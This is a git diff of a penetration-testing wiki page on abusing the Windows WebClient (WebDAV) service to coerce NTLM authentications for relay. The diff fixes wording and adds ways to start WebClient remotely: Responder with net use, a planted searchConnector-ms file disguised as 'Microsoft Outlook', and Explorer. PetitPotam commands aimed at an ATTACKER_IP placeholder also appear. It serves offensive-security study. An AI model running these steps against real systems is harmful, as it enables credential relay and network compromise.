@@ -2,7 +2,7 @@
 
 ## Theory
 
-> Web Distributed Authoring and Versioning (WebDAV) is an extension to Hypertext Transfer Protocol (HTTP) that defines how basic file functions such as copy, move, delete, and create are performed by using HTTP. ([docs.microsoft.com](https://docs.microsoft.com/en-us/windows/win32/webdav/webdav-portal))
+> Web Distributed Authoring and Versioning (WebDAV) is an extension to Hypertext Transfer Protocol (HTTP) that defines how basic file functions such as copy, move, delete, and create are performed by using HTTP ([docs.microsoft.com](https://docs.microsoft.com/en-us/windows/win32/webdav/webdav-portal))
 
 The WebClient service needs to be enabled for WebDAV-based programs and features to work. As it turns out, the WebClient service can be indirectly abused by attackers to coerce authentications. This technique needs to be combined with other coercion techniques (e.g. [PetitPotam](ms-efsr.md), [PrinterBug](ms-rprn.md)) to act as a booster for these techniques. **It allows attackers to elicit authentications made over HTTP instead of SMB**, hence heightening [NTLM relay](../ntlm/relay.md) capabilities.
 
@@ -10,7 +10,7 @@ The WebClient service needs to be enabled for WebDAV-based programs and features
 
 ### Recon
 
-Attackers can remotely enumerate systems on which the WebClient is running, which is not uncommon in organisations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string.
+Attackers can remotely enumerate systems on which the WebClient is running, which is not uncommon in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string.
 
 {% tabs %}
 {% tab title="UNIX-like" %}
@@ -30,25 +30,6 @@ GetWebDAVStatus.exe 'machine'
 ```
 {% endtab %}
 {% endtabs %}
-
-{% hint style="info" %}
-Making a remote system start the WebClient service can be done with a [searchConnector-ms](https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) file uploaded to widely used share within the organisation. Each time a user browses the folder, the WebClient service will start transparently.
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
-    <description>Microsoft Outlook</description>
-    <isSearchOnlyItem>false</isSearchOnlyItem>
-    <includeInStartMenuScope>true</includeInStartMenuScope>
-    <templateInfo>
-        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
-    </templateInfo>
-    <simpleLocation>
-        <url>https://whatever/</url>
-    </simpleLocation>
-</searchConnectorDescription>
-```
-{% endhint %}
 
 ### Abuse
 
@@ -72,6 +53,50 @@ Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
 Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
 PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
 ```
+
+### Start the WebClient service
+
+On a side note, making a remote system start the WebClient service can be done in many ways
+
+{% tabs %}
+{% tab title="Map a WebDAV server" %}
+By mapping a remote WebDAV server. This can be done by having Responder's server up and by running the `net use` cmdlet.
+
+```shell
+# starting responder (in analyze mode to prevent poisoning)
+responder --interface "eth0" --analyze
+responder -I "eth0" -A
+
+# map the drive from the target WebClient needs to be started on
+net use x: http://$RESPONDER_IP/
+```
+{% endtab %}
+
+{% tab title="searchConnector-ms" %}
+With a [searchConnector-ms](https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) file uploaded to widely used share within the organisation. Each time a user browses the folder, the WebClient service will start transparently.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>https://whatever/</url>
+    </simpleLocation>
+</searchConnectorDescription>
+```
+{% endtab %}
+
+{% tab title="Explorer" %}
+By opening an interactive session with the target (e.g. RDP), opening the Explorer, and type something in the address bar.
+{% endtab %}
+{% endtabs %}
+
+
 
 ## Resources
 
